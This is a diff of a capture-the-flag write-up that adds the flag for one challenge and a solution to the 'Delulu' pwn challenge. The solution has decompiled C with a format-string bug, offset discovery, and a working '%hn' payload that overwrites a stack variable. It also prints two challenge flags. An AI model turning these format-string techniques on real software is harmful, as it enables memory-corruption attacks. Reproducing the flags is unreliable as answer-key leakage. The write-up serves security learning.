@@ -580,9 +580,71 @@ p.sendlineafter(">> ", b"\x00" * 7)
 p.interactive()   
 ```
 
+> Flag : HTB{3v3ryth1ng_15_r34d4bl3}
+
 </details>
 
 ## Pwn/Delulu
+
+<details>
+<summary>Decompiled Code</summary>
+
+```c
+undefined8 main(void)
+
+{
+  long in_FS_OFFSET;
+  long local_48;
+  long *local_40;
+  undefined8 local_38;
+  undefined8 local_30;
+  undefined8 local_28;
+  undefined8 local_20;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  local_48 = 0x1337babe;
+  local_40 = &local_48;
+  local_38 = 0;
+  local_30 = 0;
+  local_28 = 0;
+  local_20 = 0;
+  read(0,&local_38,0x1f);
+  printf("\n[!] Checking.. ");
+  printf((char *)&local_38);
+  if (local_48 == 0x1337beef) {
+    delulu();
+  }
+  else {
+    error("ALERT ALERT ALERT ALERT\n");
+  }
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+```
+
+</details>
+
+We have a format string vulnerability and we must modify local_48's value to 0x1337beef
+
+![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/7c3f3b3f-b9bf-41e9-abd3-ff2f1289dbea)
+
+After passing it some %p format, we can see that the 6th pointer contains `0x7fffffffdd70` and if we look at gdb, the address `0x7fffffffdd70` points to our variable which stores 0x1337babe. So, we just need to craft a format string payload to modify its value to beef
+
+![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/8e083529-a7e4-403d-8f9a-701f56146691)
+
+the value 0xbeef is 48879 in decimal.
+
+```
+%#48878x.%7$hn 
+```
+
+> Flag : HTB{m45t3r_0f_d3c3pt10n}
+
+This will be our final payload. The reason 1 is reduced from 48879 is because theres a full stop inside the payload which adds 1 to the total number of characters.
 
 ## Pwn/Rocket Blaster XXX
 
